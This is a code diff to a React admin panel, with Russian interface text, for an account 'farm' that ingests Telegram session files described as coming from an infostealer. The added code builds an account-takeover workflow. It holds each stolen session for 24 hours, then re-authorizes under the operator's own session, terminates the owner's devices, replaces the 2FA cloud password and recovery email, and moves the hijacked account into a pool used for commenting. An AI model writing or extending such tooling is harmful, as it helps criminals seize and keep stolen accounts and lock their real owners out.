@@ -180,6 +180,30 @@ const constraintMeta = (account) => {
   return { label: '—', chip: 'mute' };
 };
 
+const interceptQuiet = (account) => account?.origin === 'intercept' && !account?.intercept_can_adopt;
+
+const interceptChip = (label) => {
+  if (label === 'Холд 24 часа' || label === 'Ожидает переавторизацию') {
+    return 'hold';
+  }
+  if (label === 'Можно заливать в основной пул') {
+    return 'pool';
+  }
+  if (label === 'Идёт переавторизация') {
+    return 'info';
+  }
+  if (
+    label === 'Неуспешная переавторизация'
+    || label === 'Не удалось выпустить сессию'
+    || label === 'Нужен облачный пароль'
+    || label === 'Сессия невалидна'
+    || label === 'Прокси не отвечает'
+  ) {
+    return 'bad';
+  }
+  return 'ok';
+};
+
 const guardPauseLabel = (account) => {
   if (!account?.session_guard_paused_until) {
     return null;
@@ -244,10 +268,28 @@ const CustomAutomationAccountsPage = ({ pool = 'farm' }) => {
   const [sessionsLoading, setSessionsLoading] = useState(false);
   const [sessionsError, setSessionsError] = useState(null);
   const [terminatingHash, setTerminatingHash] = useState(null);
+  const [twoFaOpen, setTwoFaOpen] = useState(false);
+  const [twoFaBusy, setTwoFaBusy] = useState(false);
+  const [twoFaNeedCode, setTwoFaNeedCode] = useState(false);
+  const [twoFaPattern, setTwoFaPattern] = useState('');
+  const [twoFaMessage, setTwoFaMessage] = useState(null);
+  const [twoFaError, setTwoFaError] = useState(null);
+  const [twoFaForm, setTwoFaForm] = useState({
+    current_password: '',
+    new_password: '',
+    hint: '',
+    email: '',
+    code: '',
+  });
+  const [reauthPassword, setReauthPassword] = useState('');
+  const [reauthBusy, setReauthBusy] = useState(false);
 
-  const loadAccounts = useCallback(async () => {
+  const loadAccounts = useCallback(async (opts) => {
+    const silent = Boolean(opts && typeof opts === 'object' && opts.silent);
     try {
-      setIsLoading(true);
+      if (!silent) {
+        setIsLoading(true);
+      }
       const data = await customService.getAutomationAccounts(id, {
         status: filters.status || undefined,
         search: filters.search || undefined,
@@ -261,13 +303,25 @@ const CustomAutomationAccountsPage = ({ pool = 'farm' }) => {
     } catch (err) {
       setError(err.message || 'Не удалось загрузить аккаунты');
     } finally {
-      setIsLoading(false);
+      if (!silent) {
+        setIsLoading(false);
+      }
     }
   }, [id, filters.status, filters.search, filters.limit, filters.offset, pool]);
 
   useEffect(() => {
     loadAccounts();
   }, [loadAccounts]);
+
+  useEffect(() => {
+    if (!isIntercept || !accounts.some((item) => item.intercept_stage === 'reauthorizing')) {
+      return undefined;
+    }
+    const timer = window.setInterval(() => {
+      loadAccounts({ silent: true });
+    }, 4000);
+    return () => window.clearInterval(timer);
+  }, [accounts, isIntercept, loadAccounts]);
 
   const loadBanStats = useCallback(async () => {
     try {
@@ -317,15 +371,26 @@ const CustomAutomationAccountsPage = ({ pool = 'farm' }) => {
     }
   }, [id]);
 
+  const drawerStage = accounts.find((item) => item.id === drawerId)?.intercept_stage;
+
   useEffect(() => {
     if (!drawerId) {
+      setSessionItems([]);
+      setSessionsError(null);
+      setTwoFaOpen(false);
+      setTwoFaNeedCode(false);
+      setTwoFaMessage(null);
+      setTwoFaError(null);
+      return undefined;
+    }
+    if (drawerStage && drawerStage !== 'reauthorized') {
       setSessionItems([]);
       setSessionsError(null);
       return undefined;
     }
     loadSessions(drawerId);
     return undefined;
-  }, [drawerId, loadSessions]);
+  }, [drawerId, loadSessions, drawerStage]);
 
   useEffect(() => {
     const timer = window.setTimeout(() => {
@@ -627,6 +692,23 @@ const CustomAutomationAccountsPage = ({ pool = 'farm' }) => {
     }
   };
 
+  const handleReauthSession = async (account) => {
+    setReauthBusy(true);
+    setError(null);
+    try {
+      const data = await customService.reauthInterceptAccount(id, account.id, {
+        cloud_password: reauthPassword || undefined,
+      });
+      setReauthPassword('');
+      setTwoFaMessage(data.detail || 'Переавторизация запущена');
+      await loadAccounts();
+    } catch (err) {
+      setError(err.message || 'Не удалось запустить переавторизацию');
+    } finally {
+      setReauthBusy(false);
+    }
+  };
+
   const handleAdoptSessions = async (account) => {
     setError(null);
     try {
@@ -639,6 +721,50 @@ const CustomAutomationAccountsPage = ({ pool = 'farm' }) => {
       await loadBanStats();
     } catch (err) {
       setError(err.message || 'Не удалось перевести аккаунт в общий пул');
+    }
+  };
+
+  const handleTwoFaSubmit = async (account) => {
+    setTwoFaBusy(true);
+    setTwoFaError(null);
+    setTwoFaMessage(null);
+    try {
+      const data = await customService.updateAccountCloudPassword(id, account.id, {
+        current_password: twoFaForm.current_password || undefined,
+        new_password: twoFaForm.new_password,
+        hint: twoFaForm.hint || undefined,
+        email: twoFaForm.email || undefined,
+      });
+      if (data.status === 'need_email_code') {
+        setTwoFaNeedCode(true);
+        setTwoFaPattern(data.email_pattern || '');
+        setTwoFaMessage(data.detail || 'Введите код из письма');
+      } else {
+        setTwoFaOpen(false);
+        setTwoFaNeedCode(false);
+        setTwoFaForm({ current_password: '', new_password: '', hint: '', email: '', code: '' });
+        setTwoFaMessage(data.detail || 'Облачный пароль обновлён');
+      }
+    } catch (err) {
+      setTwoFaError(err.message || 'Не удалось обновить 2FA');
+    } finally {
+      setTwoFaBusy(false);
+    }
+  };
+
+  const handleTwoFaConfirm = async (account) => {
+    setTwoFaBusy(true);
+    setTwoFaError(null);
+    try {
+      const data = await customService.confirmAccountCloudPassword(id, account.id, twoFaForm.code);
+      setTwoFaOpen(false);
+      setTwoFaNeedCode(false);
+      setTwoFaForm({ current_password: '', new_password: '', hint: '', email: '', code: '' });
+      setTwoFaMessage(data.detail || 'Почта подтверждена');
+    } catch (err) {
+      setTwoFaError(err.message || 'Неверный код из почты');
+    } finally {
+      setTwoFaBusy(false);
     }
   };
 
@@ -825,7 +951,7 @@ const CustomAutomationAccountsPage = ({ pool = 'farm' }) => {
       {uploadSummary && !prepareStatus ? (
         <p className="acc-flash">
           Залито {uploadSummary.created} сессий.
-          {isIntercept ? ' Чужие устройства сбрасываем сами. Когда останется одна сессия — переведите аккаунт в общий пул.' : (
+          {isIntercept ? ' Первые 24 часа не трогаем. Потом выпускаем свою сессию, старую завершаем и только после этого можно переводить в общий пул.' : (
             <>
               {' '}
               <button type="button" className="acc-btn acc-btn--primary" onClick={handlePrepare} disabled={isPreparing}>
@@ -954,7 +1080,7 @@ const CustomAutomationAccountsPage = ({ pool = 'farm' }) => {
             <h2>{isIntercept ? 'Отдельный пул перехваченных сессий' : 'Здесь появятся ваши аккаунты'}</h2>
             <p>
               {isIntercept
-                ? 'Сюда заливаются сессии из стилера. Они не комментят и не идут в прогрев фермы, пока вы не переведёте их в общий пул.'
+                ? 'Сюда заливаются сессии из стилера. Сутки холд без касания, потом своя сессия, и только после этого перевод в общий пул.'
                 : 'Перетащите файлы прямо сюда или импортируйте вручную — комбайн подхватит сессии сам.'}
             </p>
             <div className="acc-empty-actions">
@@ -1047,6 +1173,13 @@ const CustomAutomationAccountsPage = ({ pool = 'farm' }) => {
                             <small>
                               {account.username ? `@${account.username}` : account.phone_number || `#${account.id}`}
                             </small>
+                            {(account.intercept_labels || []).length ? (
+                              <span className="acc-labels">
+                                {account.intercept_labels.map((label) => (
+                                  <span key={label} className={`acc-chip acc-chip--${interceptChip(label)}`}>{label}</span>
+                                ))}
+                              </span>
+                            ) : null}
                           </div>
                         </td>
                         <td><span className={`acc-chip acc-chip--${status.chip}`}>{status.label}</span></td>
@@ -1115,7 +1248,7 @@ const CustomAutomationAccountsPage = ({ pool = 'farm' }) => {
                 </h2>
                 <p>
                   {panel === 'import' && (isIntercept
-                    ? 'ZIP или .session из стилера. Чужие устройства обрываем сразу. В общий пул — когда останется только наша сессия.'
+                    ? 'ZIP или .session из стилера. Первые 24 часа холд. Затем своя сессия вместо залитой, и только потом перевод в общий пул.'
                     : 'ZIP с .session, одиночный .session или CSV.')}
                   {panel === 'add' && 'QR или код из SMS. 2FA — если включена.'}
                   {panel === 'proxy' && 'Список для автоназначения при заливе и подключении.'}
@@ -1247,7 +1380,13 @@ const CustomAutomationAccountsPage = ({ pool = 'farm' }) => {
                     {constraintMeta(drawerAccount).label}
                   </span>
                 ) : null}
+                {(drawerAccount.intercept_labels || []).map((label) => (
+                  <span key={label} className={`acc-chip acc-chip--${interceptChip(label)}`}>{label}</span>
+                ))}
               </div>
+              {drawerAccount.intercept_reauth_error ? (
+                <p className="acc-flash acc-flash--error">{drawerAccount.intercept_reauth_error}</p>
+              ) : null}
               <div className="form-group">
                 <label htmlFor="acc-name">Имя</label>
                 <input
@@ -1270,7 +1409,7 @@ const CustomAutomationAccountsPage = ({ pool = 'farm' }) => {
                   type="button"
                   className="acc-btn acc-btn--dark"
                   onClick={() => handleSaveProfile(drawerAccount)}
-                  disabled={savingNameId === drawerAccount.id}
+                  disabled={savingNameId === drawerAccount.id || interceptQuiet(drawerAccount)}
                 >
                   {savingNameId === drawerAccount.id ? 'Сохранение...' : 'Сохранить профиль'}
                 </button>
@@ -1286,15 +1425,17 @@ const CustomAutomationAccountsPage = ({ pool = 'farm' }) => {
                     className="acc-icon-btn"
                     title="Обновить"
                     onClick={() => loadSessions(drawerAccount.id)}
-                    disabled={sessionsLoading}
+                    disabled={sessionsLoading || interceptQuiet(drawerAccount)}
                   >
                     <Ico><path d="M21 12a9 9 0 1 1-3-6.7" /><path d="M21 3v6h-6" /></Ico>
                   </button>
                 </div>
                 <p className="form-hint">
-                  {isIntercept
-                    ? 'Все чужие устройства обрываем сразу, оставляем только эту сессию. «Код из Telegram» ставит защиту на паузу 15 минут, чтобы войти с телефона. Когда останется одна сессия, нажмите «Перевести в общий пул».'
-                    : 'Старые устройства не трогаем. Новые входы и незавершённые попытки обрываем. «Код из Telegram» даёт 15 минут на ваш вход. «Зафиксировать устройства» запоминает текущий список как свои.'}
+                  {interceptQuiet(drawerAccount)
+                    ? 'Пока стоит холд, сессию не открываем и устройства не трогаем. Через 24 часа выпустим свою сессию и завершим залитую.'
+                    : isIntercept
+                      ? 'Онлайн 24/7 на нашей сессии. Новые чужие входы обрываем. Когда метка «Можно заливать в основной пул» — переводите в ферму.'
+                      : 'Старые устройства не трогаем. Новые входы и незавершённые попытки обрываем. «Код из Telegram» даёт 15 минут на ваш вход. «Зафиксировать устройства» запоминает текущий список как свои.'}
                   {guardPauseLabel(drawerAccount) ? ` Пауза до ${guardPauseLabel(drawerAccount)}.` : ''}
                 </p>
                 {sessionsLoading ? <p className="form-hint">Загружаем устройства...</p> : null}
@@ -1334,19 +1475,160 @@ const CustomAutomationAccountsPage = ({ pool = 'farm' }) => {
                   ? ` ${WARMUP_STATUS_LABELS[drawerAccount.warmup_status] || drawerAccount.warmup_status}.`
                   : ''}
               </p>
+              {isIntercept && drawerAccount.intercept_can_adopt ? (
+                <div className="acc-2fa">
+                  {!twoFaOpen ? (
+                    <button
+                      type="button"
+                      className="acc-btn acc-btn--ghost"
+                      onClick={() => {
+                        setTwoFaOpen(true);
+                        setTwoFaNeedCode(false);
+                        setTwoFaError(null);
+                        setTwoFaMessage(null);
+                      }}
+                    >
+                      Смена 2FA
+                    </button>
+                  ) : (
+                    <>
+                      <h3>Облачный пароль</h3>
+                      <p className="form-hint">Установка или смена 2FA. Если пароль уже есть — укажите текущий. Почта нужна для восстановления, код из письма введёте следующим шагом.</p>
+                      <div className="form-group">
+                        <label htmlFor="acc-2fa-current">Текущий пароль</label>
+                        <input
+                          id="acc-2fa-current"
+                          type="password"
+                          autoComplete="off"
+                          value={twoFaForm.current_password}
+                          onChange={(event) => setTwoFaForm((prev) => ({ ...prev, current_password: event.target.value }))}
+                          placeholder="Если 2FA уже включена"
+                        />
+                      </div>
+                      <div className="form-group">
+                        <label htmlFor="acc-2fa-new">Новый пароль</label>
+                        <input
+                          id="acc-2fa-new"
+                          type="password"
+                          autoComplete="new-password"
+                          value={twoFaForm.new_password}
+                          onChange={(event) => setTwoFaForm((prev) => ({ ...prev, new_password: event.target.value }))}
+                        />
+                      </div>
+                      <div className="form-group">
+                        <label htmlFor="acc-2fa-hint">Подсказка</label>
+                        <input
+                          id="acc-2fa-hint"
+                          value={twoFaForm.hint}
+                          onChange={(event) => setTwoFaForm((prev) => ({ ...prev, hint: event.target.value }))}
+                          placeholder="Коротко, без самого пароля"
+                        />
+                      </div>
+                      <div className="form-group">
+                        <label htmlFor="acc-2fa-email">Почта для подтверждения</label>
+                        <input
+                          id="acc-2fa-email"
+                          type="email"
+                          value={twoFaForm.email}
+                          onChange={(event) => setTwoFaForm((prev) => ({ ...prev, email: event.target.value }))}
+                          placeholder="recovery@example.com"
+                        />
+                      </div>
+                      {twoFaNeedCode ? (
+                        <div className="form-group">
+                          <label htmlFor="acc-2fa-code">Код из почты{twoFaPattern ? ` (${twoFaPattern})` : ''}</label>
+                          <input
+                            id="acc-2fa-code"
+                            value={twoFaForm.code}
+                            onChange={(event) => setTwoFaForm((prev) => ({ ...prev, code: event.target.value }))}
+                            placeholder="Код из письма Telegram"
+                          />
+                        </div>
+                      ) : null}
+                      {twoFaError ? <p className="acc-flash acc-flash--error">{twoFaError}</p> : null}
+                      {twoFaMessage ? <p className="form-hint">{twoFaMessage}</p> : null}
+                      <div className="acc-cta" style={{ justifyContent: 'flex-start' }}>
+                        {twoFaNeedCode ? (
+                          <button
+                            type="button"
+                            className="acc-btn acc-btn--primary"
+                            disabled={twoFaBusy || !twoFaForm.code.trim()}
+                            onClick={() => handleTwoFaConfirm(drawerAccount)}
+                          >
+                            {twoFaBusy ? 'Проверка...' : 'Подтвердить код'}
+                          </button>
+                        ) : (
+                          <button
+                            type="button"
+                            className="acc-btn acc-btn--primary"
+                            disabled={twoFaBusy || !twoFaForm.new_password.trim()}
+                            onClick={() => handleTwoFaSubmit(drawerAccount)}
+                          >
+                            {twoFaBusy ? 'Сохранение...' : 'Сохранить 2FA'}
+                          </button>
+                        )}
+                        <button type="button" className="acc-btn acc-btn--ghost" disabled={twoFaBusy} onClick={() => setTwoFaOpen(false)}>
+                          Отмена
+                        </button>
+                      </div>
+                    </>
+                  )}
+                </div>
+              ) : null}
+              {twoFaMessage && !twoFaOpen ? <p className="acc-flash">{twoFaMessage}</p> : null}
+              {isIntercept ? (
+                <div className="acc-2fa">
+                  <h3>Переавторизация сессии</h3>
+                  <p className="form-hint">
+                    Переавторизация: новая сессия на том же прокси, старая подтверждает её, завершает чужие устройства и только потом удаляет себя.
+                    Если новая сессия не встанет — старую не трогаем. Это занимает несколько минут.
+                    {drawerAccount.intercept_has_cloud_password ? ' Облачный пароль сохранён и будет использован.' : ' Если на аккаунте 2FA — укажите пароль.'}
+                  </p>
+                  <div className="form-group">
+                    <label htmlFor="acc-reauth-2fa">Облачный пароль 2FA</label>
+                    <input
+                      id="acc-reauth-2fa"
+                      type="password"
+                      autoComplete="off"
+                      value={reauthPassword}
+                      onChange={(event) => setReauthPassword(event.target.value)}
+                      placeholder={drawerAccount.intercept_has_cloud_password ? 'Оставьте пустым, чтобы взять сохранённый' : 'Если 2FA включена'}
+                    />
+                  </div>
+                  <button
+                    type="button"
+                    className="acc-btn acc-btn--primary"
+                    disabled={reauthBusy || drawerAccount.intercept_can_reauth === false}
+                    onClick={() => handleReauthSession(drawerAccount)}
+                  >
+                    {drawerAccount.intercept_stage === 'reauthorizing' || reauthBusy ? 'Переавторизация...' : 'Переавторизовать сессию'}
+                  </button>
+                </div>
+              ) : null}
               <div className="acc-cta" style={{ justifyContent: 'flex-start' }}>
                 <button
                   type="button"
                   className="acc-btn acc-btn--ghost"
                   onClick={() => handleCheckSpamblock(drawerAccount)}
-                  disabled={checkingSpamblockId === drawerAccount.id}
+                  disabled={checkingSpamblockId === drawerAccount.id || interceptQuiet(drawerAccount)}
                 >
                   {checkingSpamblockId === drawerAccount.id ? 'Проверка...' : 'Проверить спамблок'}
                 </button>
-                <button type="button" className="acc-btn acc-btn--ghost" onClick={() => handleTelegramCode(drawerAccount)}>
+                <button
+                  type="button"
+                  className="acc-btn acc-btn--ghost"
+                  onClick={() => handleTelegramCode(drawerAccount)}
+                  disabled={interceptQuiet(drawerAccount)}
+                >
                   {loginCodes[drawerAccount.id]?.loading ? 'Читаем...' : 'Код из Telegram'}
                 </button>
-                <button type="button" className="acc-btn acc-btn--dark" onClick={() => handleAdoptSessions(drawerAccount)}>
+                <button
+                  type="button"
+                  className="acc-btn acc-btn--dark"
+                  onClick={() => handleAdoptSessions(drawerAccount)}
+                  disabled={isIntercept && !drawerAccount.intercept_can_adopt}
+                  title={isIntercept && !drawerAccount.intercept_can_adopt ? 'Сначала дождитесь переавторизации' : undefined}
+                >
                   {isIntercept ? 'Перевести в общий пул' : 'Зафиксировать устройства'}
                 </button>
                 <button type="button" className="acc-btn acc-btn--ghost" onClick={() => handleDeleteAccount(drawerAccount)}>
